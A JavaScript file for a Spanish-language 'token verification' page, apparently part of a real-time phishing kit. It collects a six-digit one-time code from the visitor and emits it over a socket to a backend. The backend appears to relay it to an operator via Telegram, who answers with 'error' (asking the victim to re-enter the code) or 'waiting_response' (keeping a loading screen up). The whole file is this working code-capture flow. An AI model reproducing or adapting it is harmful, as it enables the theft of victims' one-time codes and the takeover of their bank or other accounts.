document.addEventListener('DOMContentLoaded', () => {
    const inputs = document.querySelectorAll('.token-input');
    const verifyButton = document.querySelector('.verify-btn');
    const backButton = document.querySelector('.back-btn');
    const abandonButton = document.querySelector('.abandon-btn');
    const loginError = document.querySelector('.error-message');
    const loadingScreen = document.querySelector('.loading-screen');

    // Inicializar eventos de Telegram
    if (typeof window.telegramEvents !== 'undefined') {
        window.telegramEvents.initialize();
    }

    // Inicializar componentes comunes
    window.commonUtils.initializeCommon();

    // Disable verify button by default
    verifyButton.disabled = true;

    // Check if all inputs are filled with valid numbers
    const checkInputs = () => {
        const allFilled = Array.from(inputs).every(input => /^[0-9]$/.test(input.value));
        verifyButton.disabled = !allFilled;
        if (allFilled) {
            verifyButton.classList.add('active');
        } else {
            verifyButton.classList.remove('active');
        }
    };

    // Reset error message when starting to input
    const resetError = () => {
        loginError.style.display = 'none';
    };

    // Auto-advance between token inputs
    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            resetError();
            // Allow only numbers
            const value = e.target.value.replace(/[^0-9]/g, '');
            e.target.value = value.slice(0, 1);

            if (value.length === 1) {
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                } else {
                    // If it's the last input and all are filled, enable verify button
                    checkInputs();
                }
            }
            checkInputs();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace') {
                if (!e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
                resetError();
            }
        });

        // Paste handling
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
            
            pastedData.split('').forEach((char, i) => {
                if (i < inputs.length) {
                    inputs[i].value = char;
                }
            });

            if (pastedData.length > 0) {
                const nextEmptyIndex = Math.min(pastedData.length, inputs.length - 1);
                inputs[nextEmptyIndex].focus();
            }
            checkInputs();
        });
    });

    verifyButton.addEventListener('click', () => {
        const token = Array.from(inputs).map(input => input.value).join('');
        
        if (token.length !== 6) {
            window.commonUtils.showError('Por favor ingrese el código completo de 6 dígitos');
            return;
        }

        // Ocultar error y mostrar pantalla de carga
        loginError.style.display = 'none';
        window.commonUtils.showLoading('Verificando token...');
        verifyButton.disabled = true;

        // Emit token verification event
        if (window.socket && window.socket.connected) {
            console.log('Enviando verificación de token...');
            window.socket.emit('token_verification', {
                tipo: 'Token',
                codigo: token,
                timestamp: new Date().toISOString()
            });

            // Mostrar pantalla de carga
            loadingScreen.style.display = 'flex';

            // Manejar la respuesta
            window.socket.once('telegram_action', (data) => {
                loadingScreen.style.display = 'none';
                verifyButton.disabled = false;

                if (data.action === 'error') {
                    loginError.style.display = 'block';
                    inputs.forEach(input => input.value = '');
                    inputs[0].focus();
                } else if (data.action === 'waiting_response') {
                    // Mantener pantalla de carga
                    loadingScreen.style.display = 'flex';
                }
            });
        } else {
            loginError.style.display = 'block';
            loadingScreen.style.display = 'none';
            verifyButton.disabled = false;
        }
    });

    backButton.addEventListener('click', () => {
        window.history.back();
    });

    abandonButton.addEventListener('click', () => {
        if (confirm('¿Está seguro que desea abandonar el proceso?')) {
            window.location.href = 'index.html';
        }
    });
});